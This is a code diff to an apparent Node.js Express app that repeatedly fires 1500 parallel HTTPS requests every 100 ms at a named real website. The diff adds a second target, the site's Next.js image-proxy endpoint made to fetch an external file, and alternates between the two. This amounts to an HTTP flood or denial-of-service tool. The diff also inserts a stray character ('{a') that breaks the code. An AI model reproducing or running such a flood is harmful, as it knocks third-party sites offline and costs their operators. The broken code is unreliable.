@@ -15,7 +15,7 @@ const app = express();
 const port = process.env.PORT || 3000;
 
 // Continuous hit process management
-let continuousStats = {
+let continuousStats = {a
   isRunning: false,
   startTime: null,
   totalRequests: 0,
@@ -28,6 +28,7 @@ let continuousStats = {
 // Automatic continuous hitting function
 function startContinuousHitting() {
   const targetUrl = process.env.TARGET_URL || 'https://ainewsworld.ai/';
+  const additionalUrl = 'https://ainewsworld.ai/_next/image?url=https://github.com/python/cpython/blob/main/Objects/listsort.txt&w=640&q=75';
   const intervalMs = parseInt(process.env.HIT_INTERVAL) || 100;
   const parallelThreads = 1500;
   
@@ -44,20 +45,22 @@ function startContinuousHitting() {
   continuousStats.lastRequestTime = null;
   continuousStats.averageResponseTime = 0;
   
-  console.log(`Starting automatic continuous hits to ${targetUrl} with ${parallelThreads} parallel threads and ${intervalMs}ms interval`);
+  console.log(`Starting automatic continuous hits to ${targetUrl} and ${additionalUrl} with ${parallelThreads} parallel threads and ${intervalMs}ms interval`);
   
   const hitTarget = async () => {
     if (!continuousStats.isRunning) return;
     
-    // Create 15 parallel requests
+    // Create parallel requests for both URLs
     const promises = [];
     
     for (let i = 0; i < parallelThreads; i++) {
+      // Alternate between the two URLs
+      const url = i % 2 === 0 ? targetUrl : additionalUrl;
       const requestStart = Date.now();
       
       const promise = new Promise((resolve) => {
         try {
-          const req = https.get(targetUrl, (res) => {
+          const req = https.get(url, (res) => {
             let data = '';
             res.on('data', chunk => data += chunk);
             res.on('end', () => {
@@ -76,7 +79,7 @@ function startContinuousHitting() {
               continuousStats.averageResponseTime = 
                 (continuousStats.averageResponseTime * (continuousStats.totalRequests - 1) + responseTime) / continuousStats.totalRequests;
               
-              console.log(`Auto hit #${continuousStats.totalRequests} (thread ${i+1}): ${res.statusCode} (${responseTime}ms)`);
+              console.log(`Auto hit #${continuousStats.totalRequests} (thread ${i+1}): ${res.statusCode} (${responseTime}ms) - ${url}`);
               
               resolve({ statusCode: res.statusCode, responseTime });
             });
@@ -92,7 +95,7 @@ function startContinuousHitting() {
             continuousStats.averageResponseTime = 
               (continuousStats.averageResponseTime * (continuousStats.totalRequests - 1) + responseTime) / continuousStats.totalRequests;
             
-            console.error(`Auto hit error #${continuousStats.totalRequests} (thread ${i+1}):`, error.message);
+            console.error(`Auto hit error #${continuousStats.totalRequests} (thread ${i+1}): ${error.message} - ${url}`);
             
             resolve({ error: error.message, responseTime });
           });
@@ -108,7 +111,7 @@ function startContinuousHitting() {
             continuousStats.averageResponseTime = 
               (continuousStats.averageResponseTime * (continuousStats.totalRequests - 1) + responseTime) / continuousStats.totalRequests;
             
-            console.error(`Auto hit timeout #${continuousStats.totalRequests} (thread ${i+1})`);
+            console.error(`Auto hit timeout #${continuousStats.totalRequests} (thread ${i+1}) - ${url}`);
             
             resolve({ error: 'Request timeout', responseTime });
           });
@@ -123,7 +126,7 @@ function startContinuousHitting() {
           continuousStats.averageResponseTime = 
             (continuousStats.averageResponseTime * (continuousStats.totalRequests - 1) + responseTime) / continuousStats.totalRequests;
           
-          console.error(`Auto hit error #${continuousStats.totalRequests} (thread ${i+1}):`, error.message);
+          console.error(`Auto hit error #${continuousStats.totalRequests} (thread ${i+1}): ${error.message} - ${url}`);
           
           resolve({ error: error.message, responseTime });
         }
